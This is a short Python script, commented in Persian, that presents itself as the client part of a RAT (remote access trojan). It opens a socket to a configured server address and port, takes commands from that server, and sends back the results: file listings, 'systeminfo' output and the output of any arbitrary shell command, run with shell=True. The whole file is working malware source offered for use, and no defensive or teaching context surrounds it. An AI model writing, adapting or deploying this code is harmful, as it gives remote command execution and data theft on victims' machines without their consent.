import socket
import subprocess
import os
# تنظیمات سرور RAT
SERVER_IP = '127.0.0.1'  # آدرس IP سیستم هدف (برای تست می‌توانید از 'localhost' استفاده کنید)
SERVER_PORT = 8080  # پورت برای ارتباط با سرور

# ایجاد اتصال به سرور
def connect_to_server():
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))
        print(f"Connected to server at {SERVER_IP}:{SERVER_PORT}")
        return client_socket
    except Exception as e:
        print(f"Error connecting to server: {e}")
        return None

# دریافت دستور از سرور و اجرا آن
def receive_and_execute(client_socket):
    while True:
        try:
            # دریافت دستور از سرور
            command = client_socket.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                print("Exiting...")
                break
            
            # اگر دستور لیست فایل‌ها باشد
            if command.lower() == 'list':
                files = os.listdir('.')
                client_socket.send(str(files).encode())
            
            # اجرای دستور سیستم و ارسال نتایج
            elif command.lower() == 'sysinfo':
                system_info = os.popen("systeminfo").read()
                client_socket.send(system_info.encode())
            
            # اجرای هر دستور shell
            else:
                output = subprocess.check_output(command, shell=True)
                client_socket.send(output)
        except Exception as e:
            print(f"Error while receiving/executing command: {e}")
            break

# برنامه اصلی
if __name__ == "__main__":
    client_socket = connect_to_server()
    if client_socket:
        receive_and_execute(client_socket)
        client_socket.close()
